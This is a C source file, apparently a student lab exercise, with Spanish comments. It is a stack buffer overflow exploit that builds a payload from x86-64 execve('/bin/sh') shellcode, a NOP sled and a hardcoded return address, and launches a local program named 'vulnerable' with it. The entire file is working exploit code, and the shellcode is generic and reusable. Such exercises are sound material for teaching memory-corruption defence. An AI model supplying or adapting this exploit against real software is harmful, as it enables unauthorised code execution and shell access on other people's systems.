#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    unsigned char shellcode[] = 
    "\x48\x31\xc0"                              // xor    rax, rax              ; limpiar rax
    "\xb0\x3b"                                  // mov    al, 0x3b              ; syscall número 59 (execve)
    "\x48\x31\xff"                              // xor    rdi, rdi              ; limpiar rdi
    "\x57"                                      // push   rdi                   ; null terminator para argv/envp
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov rdi, 0x68732f6e69622f2f  ; "/bin//sh"
    "\x57"                                      // push   rdi                   ; push "/bin//sh" al stack
    "\x48\x89\xe7"                              // mov    rdi, rsp              ; rdi -> puntero a "/bin//sh"
    "\x48\x31\xf6"                              // xor    rsi, rsi              ; argv = NULL
    "\x48\x31\xd2"                              // xor    rdx, rdx              ; envp = NULL
    "\x0f\x05";                                 // syscall                      ; ejecutar execve("/bin/sh", NULL, NULL)

    int offset = 72;
    int shellcode_len = sizeof(shellcode) - 1;
    printf("SHELLCODE LENGTH: %d\n", shellcode_len);
    int nop_len = offset - shellcode_len;
    printf("NOP LENGTH: %d\n", nop_len);
    int total_len = offset + 8;
    printf("TOTAL LENGTH: %d\n", total_len);

    char payload[total_len];
    memset(payload, 0x90, nop_len); // NOP sled
    memcpy(payload + nop_len, shellcode, shellcode_len); // copiar shellcode

    unsigned long ret_address = 0x00007fffffffef7d; // Dirección del buffer
    memcpy(payload + offset, &ret_address, 8); // Colocar dirección de retorno (en little endian)

    char *args[] = {"/home/ONYX/Desktop/DEV/Practica2/vulnerable", payload, NULL};
    execve(args[0], args, NULL);

    return 1;
}
